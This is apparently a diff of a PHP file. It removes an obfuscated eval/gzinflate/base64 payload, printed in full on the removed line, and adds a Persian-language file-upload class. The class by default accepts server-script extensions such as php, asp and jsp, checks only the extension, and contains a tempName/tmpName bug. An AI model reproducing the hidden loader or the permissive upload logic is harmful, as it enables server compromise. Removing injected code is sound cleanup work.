@@ -1,3 +1,125 @@
 <?php
-eval("\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'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'\x29\x29\x29\x3B");
-?>
+class CUpload {
+    public $maxSize; //in byte eg:10485760=10 MB
+    public $minSize; ////in byte
+    public $allowedType; //predefined types such as 'image' or user defined types in array
+    public $type; //$_FILES['userfile']['type']
+    public $extension; //uploaded file extension
+    public $name; //$_FILES['userfile']['name']
+    public $size; //$_FILES['userfile']['size'](in bytes)
+    public $tmpName; //$_FILES['userfile']['tmp_name']
+    public $error;
+    public $errorMessage;
+    public $errorType;
+    /*
+     *file upload error types
+    */
+    const OK = 0; //no error
+    const MAX_SIZE = 1; //max size error
+    const MIN_SIZE = 2; //min size error
+    const PARTIAL = 3; // The uploaded file was only partially uploaded.
+    const NO_FILE = 4; //No file was uploaded.
+    const EXT = 5; //extension error
+    const TMP_DIR = 6; //problem in finding tmp directory
+    const CANT_WRITE = 7; // Failed to write file to disk.
+    const OTHER = 8;
+    private $image = array('gif', 'jpeg', 'jpg', 'png', 'tiff', 'jpe', 'pjpeg', 'psd', 'svg', 'ps', 'ai',);
+    private $archive = array('zip', 'zipx', 'rar', 'bz2', 'gz', 'lz', 'lzma', 'lzo', 'rz', 'gzip', 'xz', 'z', 'Z', '7z', 's7z', 'ace', 'cab', 'gca', 'sda', 'xar', 'zz', 'bzip2', 'lzip', 'iso', 'vcd', 'sit', 'sitx');
+    private $executive = array('jar', 'rpm', 'deb', 'pkg', 'exe', 'msi', 'dll', 'bat', 'cgi', 'app', 'com', 'gadget', 'pif', 'vb', 'wsf', 'sav', 'torrent');
+    private $document = array('doc', 'docx', 'docm', 'dotx', 'dotm', 'ppt', 'pptx', 'pps', 'ppsx', 'xls', 'xlr', 'xlsx', 'rtf', 'wpd', 'wp', 'wp7', 'wps', 'fb2', 'odt', 'sxw', 'pages', 'asp', 'html', 'mht', 'htm', 'xhtml', 'pdf', 'djvu', 'epub', 'tex', 'txt', 'sql', 'php', 'xml', 'log', 'msg', 'css', 'js', 'thm', 'thmx', 'rss', 'jsp', 'dtd', 'torrent');
+    private $video = array('mpeg', 'mpg', 'mpe', 'avi', 'wmv', 'mov', 'flv', '3gp', 'asf', 'asx', 'mp4', 'rm', 'swf', 'vob', 'dat');
+    private $font = array('fnt', 'fon', 'ttf', 'otf',);
+    private $audio = array('mp3', 'wav', 'aiff', 'aif', 'amr', 'aif', 'iff', 'm3u', 'm4a', 'mid', 'mpa', 'ra',);
+    public function reset() {
+        unset($this->type);
+        unset($this->extension);
+        unset($this->name);
+        unset($this->size);
+        unset($this->tmpName);
+        unset($this->error);
+        unset($this->errorMessage);
+    }
+    /*
+     * return: TRUE or FALSE
+    */
+    public function run($field, $required = TRUE) {
+        if (!isset($_FILES[$field])) {
+            if ($required === TRUE) {
+                $this->errorMessage = 'آپلود فایل الزامی است.';
+                $this->errorType = self::NO_FILE;
+                return FALSE;
+            } else {
+                return TRUE;
+            }
+        }
+        $this->reset(); //if we have multiple file upload with only one class!
+        $allowedFormats = '';
+        if (is_array($this->allowedType)) {
+            $allowedFormats = $this->allowedType;
+        } elseif (is_string($this->allowedType)) {
+            $temp = $this->allowedType;
+            if (is_array($this->$temp)) $allowedFormats = $this->$temp;
+        }
+        if (!is_array($allowedFormats)) {
+            $allowedFormats = array_merge((array)$this->archive, (array)$this->audio, (array)$this->document, (array)$this->executive, (array)$this->font, (array)$this->image, (array)$this->video);
+        }
+        if ($this->allowedExtension($field, $allowedFormats) === FALSE) {
+            $this->errorMessage = 'این فرمت فایل مجاز نمی باشد.';
+            $this->errorType = self::EXT;
+            return FALSE;
+        }
+        if (!empty($this->maxSize)) {
+            if ($_FILES[$field]["size"] > $this->maxSize) {
+                $this->errorMessage = 'حداکثر اندازه فایل ' . $this->maxSize . ' بایت می‌تواند باشد.';
+                $this->errorType = self::MAX_SIZE;
+                return FALSE;
+            }
+        }
+        if (!empty($this->minSize)) {
+            if ($_FILES[$field]["size"] < $this->minSize) {
+                $this->errorMessage = 'حداقل اندازه فایل ' . $this->minSize . ' بایت می‌تواند باشد.';
+                $this->errorType = self::MIN_SIZE;
+                return FALSE;
+            }
+        }
+        if ($_FILES[$field]["error"] == UPLOAD_ERR_OK) {
+            $tmp = explode(".", $_FILES[$field]["name"]);
+            $this->extension = end($tmp);
+            $this->name = $_FILES[$field]["name"];
+            $this->type = $_FILES[$field]["type"];
+            $this->tmpName = $_FILES[$field]["tmp_name"];
+            $this->size = $_FILES[$field]["size"];
+            $this->error = $_FILES[$field]["error"];
+            $this->errorType = self::OK;
+            return TRUE;
+        } elseif ($_FILES[$field]["error"] == 4) {
+            $this->error = $_FILES[$field]["error"];
+            if ($required === TRUE) {
+                $this->errorMessage = 'آپلود فایل الزامی است.';
+                $this->errorType = self::NO_FILE;
+                return FALSE;
+            } else {
+                return TRUE;
+            }
+        } else {
+            $this->errorMessage = 'مشکلی در آپلود فایل پیش آمده است.';
+            $this->error = $_FILES[$field]["error"];
+            $this->errorType = self::OTHER;
+            return FALSE;
+        }
+    }
+    public function saveAs($file, $deleteTempFile = TRUE) {
+        if ($this->error == UPLOAD_ERR_OK) {
+            if ($deleteTempFile) return move_uploaded_file($this->tmpName, $file);
+            else if (is_uploaded_file($this->tempName)) return copy($this->tempName, $file);
+            else return FALSE;
+        } else return FALSE;
+    }
+    private function allowedExtension($field, $extensions) {
+        if (!empty($_FILES[$field]["name"])) {
+            $tmp = explode(".", $_FILES[$field]["name"]);
+            return in_array(end($tmp), $extensions);
+        }
+        return TRUE;
+    }
+}
